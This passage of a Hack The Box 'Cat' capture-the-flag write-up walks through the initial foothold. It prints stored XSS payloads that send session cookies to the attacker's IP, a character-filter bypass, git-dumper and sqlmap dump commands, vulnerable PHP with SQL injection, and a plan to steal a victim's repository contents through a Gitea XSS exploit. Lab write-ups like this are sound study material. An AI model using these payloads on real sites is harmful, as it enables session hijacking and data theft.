## Initial Foothold

Site doesn't show much, just a sign up page. Made an account and logged in:
![](/assets/blogimages/Writeups/Hackthebox/Cat/Cat2.png)

After logging in there's an option to register a cat for the contest. Filled in random details, clicked Register Cat, got "Cat has been successfully sent for inspection.":
![](/assets/blogimages/Writeups/Hackthebox/Cat/Cat3.png)

Sounds like an admin reviews submissions on their end, good spot for stored XSS to steal cookies. Set up `nc -lvnp 1234` and put this in the Cat Name field:
```
<script>document.location='http://<tun0_IP>:1234/cookiegrab.php?c='+document.cookie</script>
```
![](/assets/blogimages/Writeups/Hackthebox/Cat/Cat4.png)
Got an error, "Your entry contains invalid characters." :(

So something's up with the payload, probably some filtering server side.

Going back to dirsearch, there's a `/.git` directory. Dumped it with `git-dumper http://cat.htb/.git .` and got the source:
![](/assets/blogimages/Writeups/Hackthebox/Cat/Cat5.png)

Let's check `contest.php` first, probably has the filtering:
```
function contains_forbidden_content($input, $pattern) {
    return preg_match($pattern, $input);
}
...
$forbidden_patterns = "/[+*{}',;<>()\\[\\]\\/\\:]/";

if (contains_forbidden_content($cat_name, $forbidden_patterns) ||
    contains_forbidden_content($age, $forbidden_patterns) ||
    contains_forbidden_content($birthdate, $forbidden_patterns) ||
    contains_forbidden_content($weight, $forbidden_patterns)) {
    $error_message = "Your entry contains invalid characters.";
}
```
`cat_name`, `age`, `birthdate` and `weight` all get checked against this regex before hitting the DB, explains the error from before. Blocked symbols:
`+  *  {  }  '  ,  ;  <  >  (  )  [  ]  /  :`

None of these fields cover the uploaded filename though, so tried XSS there instead. Payload:
```
x.jpg\" onerror=\"document.location='http:'+String.fromCharCode(47,47)+'10.10.14.182:4444'+String.fromCharCode(47)+document.cookie\" x=\"y.jpg
```
Sent it via Burp as the filename:
![](/assets/blogimages/Writeups/Hackthebox/Cat/Cat6.png)

Got a cookie back on `nc -lvnp 4444`:
![](/assets/blogimages/Writeups/Hackthebox/Cat/Cat7.png)

Using that cookie unlocks the admin tab:
![](/assets/blogimages/Writeups/Hackthebox/Cat/Cat8.png)


Admin panel has view, accept and delete cats, each its own php script. `accept_cat.php` has a SQLi:
```
$cat_name = $_POST['catName'];
$sql_insert = "INSERT INTO accepted_cats (name) VALUES ('$cat_name')";
$pdo->exec($sql_insert);
```
No sanitization, no prepare/bind. `cat_name` is filtered on `contest.php` but not here, so via the XSS I can just POST straight to `accept_cat.php` with any `catName`.

Intercepted the accept cat request and saved it in Burp:
![](/assets/blogimages/Writeups/Hackthebox/Cat/Cat9.png)
`config.php` from git dump confirmed sqlite3, so ran:
`sqlmap -r req --dump --batch --dbms=sqlite`

![](/assets/blogimages/Writeups/Hackthebox/Cat/Cat13.png)

Gitea footer shows version 1.22.0, which has [this exploit](https://www.exploit-db.com/exploits/52077). Someone just needs to view the repo's description for it to trigger. So the plan: create a repo, put XSS in the description, get a victim to view it and send me the `README.md` contents, same trick as with the filename before. Mail said to email jobert about the repo, so he's the target.
